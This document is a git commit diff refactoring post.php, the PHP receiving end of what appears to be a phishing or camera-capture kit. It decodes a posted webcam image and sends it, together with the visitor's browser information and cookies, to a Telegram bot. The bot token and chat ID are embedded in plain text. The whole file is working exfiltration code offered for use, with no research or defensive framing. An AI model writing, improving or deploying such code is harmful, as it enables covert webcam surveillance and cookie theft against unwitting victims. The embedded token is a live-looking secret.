b3ad0254bc84995d505af4888b585ac8fc7f8710
tag963 <alidm0935@gmail.com>
2026-06-09 16:19:41 -0400

    Refactor image and info handling in post.php

--- post.php
+++ post.php
@@ -2,31 +2,26 @@
 $botToken = "8771622459:AAHTQLVU5fSRbP_gTZ4nFkqSKw2vyyHSlgM";
 $chatId = "8504751121";
 
-// استقبال البيانات
-$img = $_POST['img'];
-$info = $_POST['info'];
-$cookies = $_POST['cookies'];
+if (isset($_POST['img'])) {
+    $imageData = substr($_POST['img'], strpos($_POST['img'], ",")+1);
+    $binaryData = base64_decode($imageData);
+    $fileName = 'cam.jpg';
+    file_put_contents($fileName, $binaryData);
 
-// إرسال البيانات النصية
-if (!empty($info)) {
-    $text = "بيانات المتصفح:\n" . $info . "\n\nالكوكيز:\n" . $cookies;
+    // إرسال النص أولاً
+    $info = isset($_POST['info']) ? $_POST['info'] : "N/A";
+    $cookies = isset($_POST['cookies']) ? $_POST['cookies'] : "N/A";
+    $text = "Info: $info\nCookies: $cookies";
     file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text));
-}
 
-// إرسال الصورة
-if (!empty($img)) {
-    $filteredData = substr($img, strpos($img, ",")+1);
-    $unencodedData = base64_decode($filteredData);
-    $tempFileName = 'cam_' . time() . '.png';
-    file_put_contents($tempFileName, $unencodedData);
-
-    $postFields = ['chat_id' => $chatId, 'photo' => new CURLFile(realpath($tempFileName))];
+    // إرسال الصورة
+    $postFields = ['chat_id' => $chatId, 'photo' => new CURLFile(realpath($fileName))];
     $ch = curl_init("https://api.telegram.org/bot$botToken/sendPhoto");
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_exec($ch);
     curl_close($ch);
-    unlink($tempFileName);
+    unlink($fileName);
 }
 ?>
